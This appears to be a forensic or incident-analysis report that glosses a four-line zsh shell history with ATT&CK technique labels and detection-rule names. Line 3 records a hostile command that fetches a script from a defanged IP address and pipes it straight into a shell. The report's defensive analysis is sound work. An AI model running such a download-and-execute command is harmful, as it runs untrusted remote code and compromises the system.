# `zsh_history`: interlinear transcript

Sources: `zsh_history` (sha256 `90dbab2134a2`…, 4 lines)

Glosses: 3 rule, 0 model, 0 analyst, 0 none, 1 pending · rules `2026.10.6` · ATT&CK `20.0`

## `zsh_history`

```text
   1  uname -a
      T1082 System Information Discovery   [rule: system-info]
      Collects operating system and hardware details.

   2  ps aux
      T1057 Process Discovery   [rule: process-list]
      Lists running processes, for example to spot security tools or competing malware.

   3  curl -s hxxps://203.0.113[.]7/i.sh | sh
      T1105 Ingress Tool Transfer · T1059.004 Unix Shell   [rule: download-pipe-shell]
      Downloads a script and pipes it straight into a shell, so it runs without being saved.

   4  crontab -l
      [pending]
```
